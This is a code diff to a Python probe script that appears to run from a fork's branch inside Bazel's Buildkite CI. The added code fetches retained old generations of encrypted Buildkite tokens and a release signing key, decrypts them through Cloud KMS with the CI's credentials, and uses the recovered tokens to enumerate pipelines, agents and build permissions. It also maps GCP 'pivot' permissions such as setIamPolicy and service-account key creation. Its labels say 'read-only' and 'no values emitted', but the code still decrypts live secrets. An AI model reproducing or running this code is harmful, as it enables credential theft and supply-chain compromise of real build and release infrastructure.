@@ -19,7 +19,7 @@ from typing import Any
 ORG = "bazel"
 PIPELINE = "bazel-bazel-github-presubmit"
 LABEL = "RBE on :ubuntu: Ubuntu 24.04 LTS"
-BRANCH = "matrix-kernel:security/bazel-ci-credential-boundary-20260824"
+BRANCH = "matrix-kernel:security/bazel-ci-pivot-readonly-20260826"
 REPOS = {
     "https://github.com/matrix-kernel/bazel.git",
     "git://github.com/matrix-kernel/bazel.git",
@@ -48,6 +48,7 @@ STORAGE_WRITE_PERMISSIONS = {
     "storage.buckets.delete",
     "storage.objects.create",
     "storage.objects.delete",
+    "storage.objects.update",
 }
 PROJECT_IMAGE_PERMISSIONS = [
     "compute.images.create",
@@ -123,6 +124,8 @@ KMS_SENSITIVE_PERMISSIONS = {
 }
 KMS_TARGETS = [
     ("positive_control", "bazel-untrusted", "buildkite-untrusted-api-token", False),
+    ("legacy_buildkite_api", "bazel-untrusted", "buildkite-api-token", True),
+    ("legacy_release_signing", "bazel-untrusted", "bazel-release-key", True),
     ("testing_analytics", "bazel-untrusted", "buildkite-testing-api-token", True),
     ("trusted_analytics", "bazel-public", "buildkite-trusted-api-token", True),
     ("trusted_buildkite_api", "bazel-public", "buildkite-api-token", True),
@@ -162,22 +165,22 @@ SERVICE_ACCOUNT_TARGETS = [
 # trusted release, worker-image, credential, registry, or infrastructure boundary.
 STORAGE_TARGETS = [
     ("positive_control", "bazel-untrusted-buildkite-artifacts", False),
+    ("apt_release", "bazel-apt", True),
+    ("worker_bootstrap", "bazel-git-mirror", True),
+    ("trusted_worker_bootstrap", "bazel-ci", True),
+    ("dependency_mirror", "bazel-mirror", True),
+    ("central_registry", "bcr.bazel.build", True),
+    ("terraform_state", "bazel-buildkite-tf-state", True),
+    ("trusted_credential_ciphertexts", "bazel-trusted-encrypted-secrets", True),
+    ("trusted_ci_artifacts", "bazel-trusted-buildkite-artifacts", True),
+    ("continuous_release", "bazel-builds", True),
+    ("release", "bazel", True),
+    ("release_image_backend", "artifacts.bazel-public.appspot.com", True),
+    ("credential_ciphertexts", "bazel-encrypted-secrets", True),
     ("retry_logs", "bazel-untrusted-retry-logs", False),
     ("last_green_commits", "bazel-untrusted-last-green-commits", False),
     ("shared_ci_stats", "bazel-buildkite-stats", False),
     ("kzip_archive", "bazel-kzips", False),
-    ("continuous_release", "bazel-builds", True),
-    ("release", "bazel", True),
-    ("apt_release", "bazel-apt", True),
-    ("dependency_mirror", "bazel-mirror", True),
-    ("trusted_worker_bootstrap", "bazel-ci", True),
-    ("worker_bootstrap", "bazel-git-mirror", True),
-    ("central_registry", "bcr.bazel.build", True),
-    ("terraform_state", "bazel-buildkite-tf-state", True),
-    ("trusted_credential_ciphertexts", "bazel-trusted-encrypted-secrets", True),
-    ("release_image_backend", "artifacts.bazel-public.appspot.com", True),
-    ("trusted_ci_artifacts", "bazel-trusted-buildkite-artifacts", True),
-    ("credential_ciphertexts", "bazel-encrypted-secrets", True),
     ("untrusted_build_cache", "bazel-untrusted-build-cache", False),
     ("untrusted_builds", "bazel-untrusted-builds", False),
 ]
@@ -188,11 +191,61 @@ RELEASE_PIPELINES = [
     ("bazelRelease", "bazel-release"),
     ("publishBazelBinaries", "publish-bazel-binaries"),
     ("javaToolsRelease", "java-tools-release"),
+    ("rulesJavaRelease", "rules-java-release"),
+    ("rulesPlatformRelease", "rules-platform-release"),
+    ("updateGitMirrorTarBall", "update-git-mirror-tar-ball"),
+    ("collectInfraCiMetrics", "collect-infra-ci-metrics"),
+    ("createLinuxDockerImages", "create-linux-docker-images"),
+    ("createLinuxVmImage", "create-linux-vm-image"),
+    ("bcrPostsubmit", "bcr-postsubmit"),
 ]
 PUBLIC_BUILDKITE_CIPHERTEXT_SHA256 = (
     "65ffd7fe19bc6516474f197c19b5df0bb9deeac9eaad25e8ec8852ee73ad5b8e"
 )
 PUBLIC_BUILDKITE_CIPHERTEXT_LENGTH = 126
+LEGACY_BUILDKITE_CIPHERTEXT_GENERATION = "1557928892626595"
+LEGACY_BUILDKITE_CIPHERTEXT_SHA256 = (
+    "add9e02296bfa173db699a2ba4a1325959e7a1094bc4709b49531477a379eceb"
+)
+LEGACY_BUILDKITE_CIPHERTEXT_LENGTH = 121
+LEGACY_RELEASE_KEY_GENERATION = "1557928892632272"
+LEGACY_RELEASE_KEY_CIPHERTEXT_SHA256 = (
+    "9d33da7e70447e2c3235390d2ad5493489e42aa8a5ecf7afd7d894707e98f849"
+)
+LEGACY_RELEASE_KEY_CIPHERTEXT_LENGTH = 6739
+LEGACY_RELEASE_KEY_ID_GENERATION = "1557928892656028"
+LEGACY_RELEASE_KEY_ID = "48457EE0"
+BOOTSTRAP_OBJECT = (
+    "buildkite-agent-metrics/20190906-8188dca2affcd2ffd45875af6761adacbe60bf28/"
+    "buildkite-agent-metrics-linux-amd64"
+)
+PROJECT_PIVOT_PERMISSIONS = [
+    "resourcemanager.projects.get",
+    "resourcemanager.projects.getIamPolicy",
+    "resourcemanager.projects.setIamPolicy",
+    "serviceusage.services.use",
+    "storage.buckets.create",
+    "storage.buckets.list",
+    "secretmanager.secrets.create",
+    "secretmanager.secrets.list",
+    "cloudkms.keyRings.list",
+    "cloudkms.cryptoKeys.list",
+    "artifactregistry.repositories.create",
+    "artifactregistry.repositories.list",
+    "cloudbuild.builds.create",
+    "cloudbuild.builds.get",
+    "compute.images.create",
+    "compute.instanceGroupManagers.update",
+    "compute.instanceTemplates.create",
+    "compute.instances.create",
+    "compute.instances.list",
+    "iam.serviceAccounts.create",
+    "iam.serviceAccounts.list",
+    "iam.serviceAccountKeys.create",
+    "pubsub.topics.publish",
+    "run.services.create",
+    "run.services.update",
+]
 MOCK_BUILDKITE_CIPHERTEXT_SHA256 = (
     "98c316f3f8304ee72b94b19ab57bc24e06986c65e5cbea3791309495a2f07c87"
 )
@@ -309,7 +362,7 @@ class Probe:
     def __init__(self, mode: str) -> None:
         self.mode = mode
         self.started = time.monotonic()
-        self.deadline = min(max(int(os.environ.get("PROBE_MAX_SECONDS", "45")), 10), 60)
+        self.deadline = min(max(int(os.environ.get("PROBE_MAX_SECONDS", "58")), 10), 60)
         self.timeout = min(max(int(os.environ.get("PROBE_REQUEST_TIMEOUT", "4")), 2), 8)
         self.http = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirect())
         self.secrets: set[str] = set()
@@ -953,6 +1006,70 @@ class Probe:
             }
         )
 
+    def bootstrap_object_metadata(self) -> None:
+        """Bind the bazel-ci bucket check to the exact root-executed binary."""
+        encoded = urllib.parse.quote(BOOTSTRAP_OBJECT, safe="")
+        records = []
+        for source, headers in (("anonymous", None), ("authenticated", self.bearer())):
+            code, body = self.request_json(
+                "GET",
+                f"{self.base['storage']}/storage/v1/b/bazel-ci/o/{encoded}",
+                headers,
+            )
+            exact = (
+                code == 200
+                and isinstance(body, dict)
+                and body.get("bucket") == "bazel-ci"
+                and body.get("name") == BOOTSTRAP_OBJECT
+            )
+            size = body.get("size") if exact else None
+            generation = body.get("generation") if exact else None
+            md5_hash = body.get("md5Hash") if exact else None
+            if not isinstance(size, str) or not size.isdigit():
+                size = None
+            if not isinstance(generation, str) or not generation.isdigit():
+                generation = None
+            if not isinstance(md5_hash, str) or not re.fullmatch(r"[A-Za-z0-9+/]{20,32}={0,2}", md5_hash):
+                md5_hash = None
+            records.append(
+                {
+                    "source": source,
+                    "http_status": code,
+                    "exact_object": exact,
+                    "size": int(size) if size else None,
+                    "generation": generation,
+                    "md5": md5_hash,
+                }
+            )
+        self.emit(
+            {
+                "kind": "root_bootstrap_object",
+                "resource": f"gs://bazel-ci/{BOOTSTRAP_OBJECT}",
+                "records": records,
+                "content_read": False,
+                "mutation_performed": False,
+            }
+        )
+
+    def project_permission_map(self) -> None:
+        """Check project-level pivot primitives without creating resources."""
+        for project in ("bazel-untrusted", "bazel-public"):
+            result = self.compared_post_permissions(
+                f"{self.base['crm']}/v1/projects/{project}:testIamPermissions",
+                PROJECT_PIVOT_PERMISSIONS,
+            )
+            allowed = result.get("credential_only_permissions")
+            self.emit(
+                {
+                    "kind": "project_pivot_permission_map",
+                    "project": project,
+                    **result,
+                    "credential_only_pivot_permissions": allowed,
+                    "permission_advertisement_only": True,
+                    "mutation_performed": False,
+                }
+            )
+
     def secret(self, project: str, name: str, purpose: str) -> tuple[str | None, int | None]:
         url = f"{self.base['secret']}/v1/projects/{project}/secrets/{name}/versions/latest:access"
         code, body = self.request_json("GET", url, self.bearer())
@@ -1058,6 +1175,178 @@ class Probe:
             self.proof = "trusted_buildkite_agent_registration"
         token = None
 
+    def untrusted_agent(self) -> None:
+        """Validate the source-grounded registration token without registering an agent."""
+        token, _ = self.secret(
+            "bazel-untrusted", "bazel-buildkite-agent-token", "own_agent_registration"
+        )
+        if not token:
+            return
+        code, body = self.request_json(
+            "GET", f"{self.base['agent']}/v3/metrics", {"Authorization": f"Token {token}"}
+        )
+        organization = body.get("organization") if isinstance(body, dict) else None
+        slug = organization.get("slug") if isinstance(organization, dict) else None
+        if not isinstance(slug, str) or not re.fullmatch(r"[a-z0-9][a-z0-9-]{0,62}", slug):
+            slug = None
+        self.emit(
+            {
+                "kind": "untrusted_agent_token_validation",
+                "http_status": code,
+                "organization_slug": slug,
+                "expected_organization": slug == "bazel",
+                "registration_performed": False,
+                "job_accepted": False,
+                "metrics_values_emitted": False,
+            }
+        )
+        token = None
+
+    def bazel_org_inventory(self, token: str, scopes: set[str]) -> None:
+        """Read pipeline/agent topology and effective permissions in the bazel org."""
+        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
+        pipelines: dict[str, dict[str, str | None]] = {}
+        page_statuses = []
+        for page in (1, 2):
+            code, body = self.request_json(
+                "GET",
+                f"{self.base['buildkite']}/v2/organizations/bazel/pipelines?per_page=100&page={page}",
+                headers,
+            )
+            page_statuses.append(code)
+            if code != 200 or not isinstance(body, list):
+                break
+            for item in body[:100]:
+                if not isinstance(item, dict):
+                    continue
+                slug = item.get("slug")
+                if not isinstance(slug, str) or not re.fullmatch(r"[a-z0-9][a-z0-9-]{0,127}", slug):
+                    continue
+                repository = item.get("repository")
+                parsed_repository = urllib.parse.urlsplit(repository) if isinstance(repository, str) else None
+                if (
+                    parsed_repository is None
+                    or parsed_repository.scheme != "https"
+                    or parsed_repository.hostname != "github.com"
+                    or parsed_repository.username
+                    or parsed_repository.password
+                    or parsed_repository.query
+                    or parsed_repository.fragment
+                    or not re.fullmatch(r"/[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+(?:\.git)?", parsed_repository.path)
+                ):
+                    repository = None
+                branch = item.get("default_branch")
+                if not isinstance(branch, str) or not re.fullmatch(r"[A-Za-z0-9._/-]{1,255}", branch):
+                    branch = None
+                pipelines[slug] = {"repository": repository, "default_branch": branch}
+            if len(body) < 100:
+                break
+
+        keywords = ("release", "publish", "mirror", "sheriff", "registry", "docs", "image", "bundle", "infra")
+        high_value = sorted(slug for slug in pipelines if any(word in slug for word in keywords))[:30]
+        self.emit(
+            {
+                "kind": "buildkite_bazel_pipeline_inventory",
+                "http_status_by_page": page_statuses,
+                "pipeline_count": len(pipelines),
+                "high_value_pipelines": [
+                    {"slug": slug, **pipelines[slug]} for slug in high_value
+                ],
+                "read_only_requests": True,
+            }
+        )
+
+        webhook_results = []
+        for slug in high_value[:12]:
+            code, _ = self.request_json(
+                "GET",
+                f"{self.base['buildkite']}/v2/organizations/bazel/pipelines/{slug}/github-webhooks",
+                headers,
+            )
+            webhook_results.append({"pipeline": slug, "http_status": code, "full_access_oracle": code == 200})
+        self.emit(
+            {
+                "kind": "buildkite_bazel_pipeline_full_access",
+                "pipelines": webhook_results,
+                "full_access_proven": any(item["full_access_oracle"] for item in webhook_results),
+                "read_only_requests": True,
+            }
+        )
+
+        gql_results = []
+        gql_code = None
+        gql_errors = None
+        if "graphql" in scopes and high_value:
+            fields = " ".join(
+                f'p{index}:pipeline(slug:"bazel/{slug}"){{slug organization{{slug}} permissions{{buildCreate{{allowed code}} pipelineUpdate{{allowed code}}}}}}'
+                for index, slug in enumerate(high_value[:20])
+            )
+            gql_code, response = self.request_json(
+                "POST", self.base["graphql"], headers, {"query": f"query BazelPivotPermissions{{{fields}}}"}
+            )
+            gql_errors = isinstance(response, dict) and bool(response.get("errors"))
+            data = response.get("data") if gql_code == 200 and isinstance(response, dict) and not gql_errors else {}
+            for index, slug in enumerate(high_value[:20]):
+                item = data.get(f"p{index}") if isinstance(data, dict) else None
+                permissions = item.get("permissions") if isinstance(item, dict) else None
+                build = permissions.get("buildCreate") if isinstance(permissions, dict) else None
+                update = permissions.get("pipelineUpdate") if isinstance(permissions, dict) else None
+                valid = (
+                    isinstance(item, dict)
+                    and item.get("slug") == slug
+                    and isinstance(item.get("organization"), dict)
+                    and item["organization"].get("slug") == "bazel"
+                )
+                gql_results.append(
+                    {
+                        "pipeline": slug,
+                        "identity_valid": valid,
+                        "build_create": valid and isinstance(build, dict) and build.get("allowed") is True,
+                        "pipeline_update": valid and isinstance(update, dict) and update.get("allowed") is True,
+                    }
+                )
+        self.emit(
+            {
+                "kind": "buildkite_bazel_pipeline_permissions",
+                "http_status": gql_code,
+                "graphql_scope_present": "graphql" in scopes,
+                "top_level_errors_present": gql_errors,
+                "pipelines": gql_results,
+                "build_create_proven": any(item["build_create"] for item in gql_results),
+                "pipeline_update_proven": any(item["pipeline_update"] for item in gql_results),
+                "read_only_query": True,
+            }
+        )
+
+        agents_code, agents = self.request_json(
+            "GET", f"{self.base['buildkite']}/v2/organizations/bazel/agents?per_page=100", headers
+        )
+        queue_tags = set()
+        states: dict[str, int] = {}
+        if agents_code == 200 and isinstance(agents, list):
+            for agent in agents[:100]:
+                if not isinstance(agent, dict):
+                    continue
+                state = agent.get("connection_state")
+                if isinstance(state, str) and re.fullmatch(r"[a-z_]{1,40}", state):
+                    states[state] = states.get(state, 0) + 1
+                tags = agent.get("meta_data")
+                if isinstance(tags, list):
+                    for tag in tags:
+                        if isinstance(tag, str) and re.fullmatch(r"queue=[A-Za-z0-9._-]{1,80}", tag):
+                            queue_tags.add(tag)
+        self.emit(
+            {
+                "kind": "buildkite_bazel_agent_inventory",
+                "http_status": agents_code,
+                "returned_agent_count": len(agents[:100]) if isinstance(agents, list) else 0,
+                "queue_tags": sorted(queue_tags),
+                "connection_states": states,
+                "hostnames_emitted": False,
+                "read_only_request": True,
+            }
+        )
+
     def buildkite_api(
         self,
         project: str = "bazel-untrusted",
@@ -1115,6 +1404,8 @@ class Probe:
                 "value_emitted": False,
             }
         )
+        if purpose == "known_untrusted_buildkite_api":
+            self.bazel_org_inventory(token, scopes)
         if not trusted_visible:
             self.emit(
                 {
@@ -1375,6 +1666,239 @@ class Probe:
         )
         token = None
 
+    def legacy_public_buildkite_ciphertext(self) -> None:
+        """Test the retained older generation against the already-proven KMS key."""
+        generation = LEGACY_BUILDKITE_CIPHERTEXT_GENERATION if self.mode == "live" else "1"
+        code, ciphertext = self.request(
+            "GET",
+            f"{self.base['storage']}/download/storage/v1/b/bazel-encrypted-secrets/o/"
+            f"buildkite-api-token.enc?alt=media&generation={generation}",
+        )
+        expected_sha = (
+            LEGACY_BUILDKITE_CIPHERTEXT_SHA256
+            if self.mode == "live"
+            else MOCK_BUILDKITE_CIPHERTEXT_SHA256
+        )
+        expected_length = (
+            LEGACY_BUILDKITE_CIPHERTEXT_LENGTH
+            if self.mode == "live"
+            else MOCK_BUILDKITE_CIPHERTEXT_LENGTH
+        )
+        digest = self.sha(ciphertext) if ciphertext is not None else None
+        exact = (
+            code == 200
+            and ciphertext is not None
+            and len(ciphertext) == expected_length
+            and digest == expected_sha
+        )
+        self.emit(
+            {
+                "kind": "legacy_public_buildkite_ciphertext",
+                "resource": "gs://bazel-encrypted-secrets/buildkite-api-token.enc",
+                "generation": generation,
+                "http_status": code,
+                "length": len(ciphertext) if ciphertext is not None else None,
+                "sha256": digest,
+                "exact_pinned_generation": exact,
+                "anonymous_request": True,
+                "plaintext_read": False,
+            }
+        )
+        if not exact or ciphertext is None:
+            return
+        kms_code, plaintext = self.decrypt_resource(
+            "bazel-public", "buildkite-api-token", ciphertext
+        )
+        try:
+            raw = plaintext.decode("ascii") if plaintext is not None else ""
+        except UnicodeDecodeError:
+            raw = ""
+        token = raw.strip()
+        valid_shape = (
+            kms_code == 200
+            and plaintext is not None
+            and raw in {token, f"{token}\n", f"{token}\r\n"}
+            and 20 <= len(token) <= 512
+            and not any(character.isspace() for character in token)
+        )
+        if valid_shape:
+            self.remember(token)
+        self.emit(
+            {
+                "kind": "legacy_public_buildkite_token_material",
+                "kms_http_status": kms_code,
+                "actual_decrypt": kms_code == 200 and plaintext is not None,
+                "credential_shape_valid": valid_shape,
+                "credential_type": self.family(token) if valid_shape else None,
+                "length": len(token) if valid_shape else None,
+                "sha256": self.sha(token) if valid_shape else None,
+                "in_memory_only": True,
+                "value_emitted": False,
+                "mutation_performed": False,
+            }
+        )
+        current_code, current_ciphertext = self.request(
+            "GET",
+            f"{self.base['storage']}/download/storage/v1/b/bazel-encrypted-secrets/o/"
+            "buildkite-api-token.enc?alt=media",
+        )
+        current_expected_sha = (
+            PUBLIC_BUILDKITE_CIPHERTEXT_SHA256
+            if self.mode == "live"
+            else MOCK_BUILDKITE_CIPHERTEXT_SHA256
+        )
+        current_expected_length = (
+            PUBLIC_BUILDKITE_CIPHERTEXT_LENGTH
+            if self.mode == "live"
+            else MOCK_BUILDKITE_CIPHERTEXT_LENGTH
+        )
+        current_exact = (
+            current_code == 200
+            and current_ciphertext is not None
+            and len(current_ciphertext) == current_expected_length
+            and self.sha(current_ciphertext) == current_expected_sha
+        )
+        current_kms_code = None
+        current_plaintext = None
+        current_token = ""
+        current_valid_shape = False
+        if current_exact and current_ciphertext is not None:
+            current_kms_code, current_plaintext = self.decrypt_resource(
+                "bazel-public", "buildkite-api-token", current_ciphertext
+            )
+            try:
+                current_raw = current_plaintext.decode("ascii") if current_plaintext is not None else ""
+            except UnicodeDecodeError:
+                current_raw = ""
+            current_token = current_raw.strip()
+            current_valid_shape = (
+                current_kms_code == 200
+                and current_plaintext is not None
+                and current_raw in {current_token, f"{current_token}\n", f"{current_token}\r\n"}
+                and 20 <= len(current_token) <= 512
+                and not any(character.isspace() for character in current_token)
+            )
+            if current_valid_shape:
+                self.remember(current_token)
+        self.emit(
+            {
+                "kind": "buildkite_ciphertext_generation_relationship",
+                "legacy_generation": generation,
+                "legacy_shape_valid": valid_shape,
+                "current_exact_pinned_object": current_exact,
+                "current_kms_http_status": current_kms_code,
+                "current_shape_valid": current_valid_shape,
+                "current_length": len(current_token) if current_valid_shape else None,
+                "current_sha256": self.sha(current_token) if current_valid_shape else None,
+                "exact_plaintext_match": valid_shape and current_valid_shape and token == current_token,
+                "legacy_equals_current_without_bkua_prefix": (
+                    valid_shape
+                    and current_valid_shape
+                    and current_token.startswith("bkua_")
+                    and token == current_token.removeprefix("bkua_")
+                ),
+                "values_emitted": False,
+                "read_only_requests": True,
+            }
+        )
+        if valid_shape:
+            self.buildkite_api(
+                purpose="legacy_public_ciphertext_kms_buildkite_api",
+                token_override=token,
+            )
+        if current_valid_shape:
+            self.buildkite_api(
+                purpose="current_public_ciphertext_kms_buildkite_api",
+                token_override=current_token,
+            )
+        token = None
+        plaintext = None
+        current_token = ""
+        current_plaintext = None
+
+    def legacy_public_release_key(self) -> None:
+        """Test the retained ciphertext only against exact source-grounded KMS keys."""
+        key_generation = LEGACY_RELEASE_KEY_GENERATION if self.mode == "live" else "1"
+        id_generation = LEGACY_RELEASE_KEY_ID_GENERATION if self.mode == "live" else "1"
+        key_code, ciphertext = self.request(
+            "GET",
+            f"{self.base['storage']}/download/storage/v1/b/bazel-encrypted-secrets/o/"
+            f"release-key.gpg.enc?alt=media&generation={key_generation}",
+        )
+        id_code, key_id_raw = self.request(
+            "GET",
+            f"{self.base['storage']}/download/storage/v1/b/bazel-encrypted-secrets/o/"
+            f"release-key.gpg.id?alt=media&generation={id_generation}",
+        )
+        expected_sha = (
+            LEGACY_RELEASE_KEY_CIPHERTEXT_SHA256
+            if self.mode == "live"
+            else self.sha(b"synthetic-gpg-ciphertext-not-a-secret")
+        )
+        expected_length = (
+            LEGACY_RELEASE_KEY_CIPHERTEXT_LENGTH if self.mode == "live" else 37
+        )
+        ciphertext_sha = self.sha(ciphertext) if ciphertext is not None else None
+        exact_ciphertext = (
+            key_code == 200
+            and ciphertext is not None
+            and len(ciphertext) == expected_length
+            and ciphertext_sha == expected_sha
+        )
+        key_id = key_id_raw.decode("ascii", errors="ignore").strip() if key_id_raw else ""
+        exact_key_id = id_code == 200 and key_id == LEGACY_RELEASE_KEY_ID
+        self.emit(
+            {
+                "kind": "legacy_public_release_key_ciphertext",
+                "resource": "gs://bazel-encrypted-secrets/release-key.gpg.enc",
+                "generation": key_generation,
+                "http_status": key_code,
+                "length": len(ciphertext) if ciphertext is not None else None,
+                "sha256": ciphertext_sha,
+                "exact_pinned_generation": exact_ciphertext,
+                "public_key_id_http_status": id_code,
+                "public_key_id": key_id if exact_key_id else None,
+                "active_release_key_id_match": exact_key_id,
+                "anonymous_requests": True,
+                "plaintext_read": False,
+            }
+        )
+        if not exact_ciphertext or not exact_key_id or ciphertext is None:
+            return
+        results = []
+        for project, key in (
+            ("bazel-untrusted", "bazel-release-key"),
+            ("bazel-public", "bazel-release-key"),
+            ("bazel-public", "buildkite-api-token"),
+        ):
+            kms_code, plaintext = self.decrypt_resource(project, key, ciphertext)
+            key_format = openpgp_private_format(plaintext)
+            valid = key_format is not None
+            results.append(
+                {
+                    "kms_resource": f"projects/{project}/locations/global/keyRings/buildkite/cryptoKeys/{key}",
+                    "http_status": kms_code,
+                    "private_key_valid": valid,
+                    "key_format": key_format,
+                    "key_length": len(plaintext) if valid and plaintext is not None else None,
+                    "key_sha256": self.sha(plaintext) if valid and plaintext is not None else None,
+                }
+            )
+            if valid:
+                self.proof = "legacy_bazel_release_signing_key"
+            plaintext = None
+        self.emit(
+            {
+                "kind": "legacy_public_release_key_decrypt",
+                "results": results,
+                "release_signing_key_possession": any(item["private_key_valid"] for item in results),
+                "imported": False,
+                "signed": False,
+                "value_emitted": False,
+                "mutation_performed": False,
+            }
+        )
+
     def object_bytes(self, name: str) -> tuple[int | None, bytes | None]:
         encoded = urllib.parse.quote(name, safe="")
         return self.request(
@@ -1383,10 +1907,12 @@ class Probe:
             self.bearer(),
         )
 
-    def decrypt(self, key: str, ciphertext: bytes) -> tuple[int | None, bytes | None]:
+    def decrypt_resource(
+        self, project: str, key: str, ciphertext: bytes
+    ) -> tuple[int | None, bytes | None]:
         code, body = self.request_json(
             "POST",
-            f"{self.base['kms']}/v1/projects/bazel-public/locations/global/keyRings/buildkite/cryptoKeys/{key}:decrypt",
+            f"{self.base['kms']}/v1/projects/{project}/locations/global/keyRings/buildkite/cryptoKeys/{key}:decrypt",
             self.bearer(),
             {"ciphertext": base64.b64encode(ciphertext).decode()},
         )
@@ -1395,6 +1921,9 @@ class Probe:
             return code, base64.b64decode(encoded, validate=True) if isinstance(encoded, str) else None
         except ValueError:
             return code, None
+
+    def decrypt(self, key: str, ciphertext: bytes) -> tuple[int | None, bytes | None]:
+        return self.decrypt_resource("bazel-public", key, ciphertext)
 
     def github(self) -> None:
         object_code, ciphertext = self.object_bytes("github-trusted-token.enc")
@@ -1512,7 +2041,47 @@ class Probe:
         if not self.identity():
             status("NO_GOOGLE_TOKEN")
             return
-        public_buildkite_introspection = self.mode == "live" or (
+        pivot_probe = self.mode == "live" or (
+            self.mode == "mock" and os.environ.get("PROBE_MOCK_PIVOT") == "1"
+        )
+        if pivot_probe:
+            # Start with the two exact, currently consumed Secret Manager
+            # credentials.  These are the shortest paths to a different
+            # Buildkite authorization boundary and should still complete if a
+            # slower Google API consumes the global deadline later.
+            self.buildkite_api()
+            self.untrusted_agent()
+            self.storage_access_map()
+            self.bootstrap_object_metadata()
+            self.legacy_public_release_key()
+            self.legacy_public_buildkite_ciphertext()
+            self.project_permission_map()
+            credential_summary = self.credential_permission_map(
+                self.storage_positive_control
+            )
+            self.emit(
+                {
+                    "kind": "bazel_pivot_summary",
+                    "storage_positive_control_satisfied": self.storage_positive_control,
+                    "storage_critical_write_candidates": self.storage_write_candidates,
+                    "secret_candidates": credential_summary.get("secret_candidates", []),
+                    "kms_candidates": credential_summary.get("kms_candidates", []),
+                    "service_account_candidates": credential_summary.get(
+                        "service_account_candidates", []
+                    ),
+                    "conclusive_branch": self.proof,
+                    "read_only_requests": True,
+                    "credential_values_emitted": False,
+                    "credential_values_persisted": False,
+                    "registration_performed": False,
+                    "job_accepted": False,
+                    "mutation_performed": False,
+                }
+            )
+            self.google_token = None
+            status("COMPLETE")
+            return
+        public_buildkite_introspection = (
             self.mode == "mock"
             and os.environ.get("PROBE_MOCK_PUBLIC_BUILDKITE_DECRYPT") == "1"
         )
